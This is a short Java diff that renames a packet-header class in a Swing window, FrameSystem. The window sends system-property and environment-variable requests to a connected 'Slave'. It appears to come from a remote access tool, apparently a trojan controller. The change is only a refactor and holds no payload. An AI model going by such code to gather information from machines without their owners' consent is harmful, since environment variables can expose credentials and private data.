@@ -25,7 +25,7 @@ import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Constants;
 import com.redpois0n.Slave;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 
 @SuppressWarnings("serial")
 public class FrameSystem extends BaseFrame {
@@ -67,10 +67,10 @@ public class FrameSystem extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				if (mode == Constants.MODE_PROP) {
 					clear();
-					sl.addToSendQueue(Header.SYSTEM_PROPERTIES);
+					sl.addToSendQueue(OutgoingHeader.SYSTEM_PROPERTIES);
 				} else if (mode == Constants.MODE_ENV) {
 					clear();
-					sl.addToSendQueue(Header.ENVIRONMENT_VARIABLES);
+					sl.addToSendQueue(OutgoingHeader.ENVIRONMENT_VARIABLES);
 				}
 			}
 		});
@@ -118,9 +118,9 @@ public class FrameSystem extends BaseFrame {
 		scrollPane.setViewportView(table);
 		contentPane.setLayout(gl_contentPane);
 		if (mode == Constants.MODE_PROP) {
-			sl.addToSendQueue(Header.SYSTEM_PROPERTIES);
+			sl.addToSendQueue(OutgoingHeader.SYSTEM_PROPERTIES);
 		} else if (mode == Constants.MODE_ENV) {
-			sl.addToSendQueue(Header.ENVIRONMENT_VARIABLES);
+			sl.addToSendQueue(OutgoingHeader.ENVIRONMENT_VARIABLES);
 		}
 	}
 
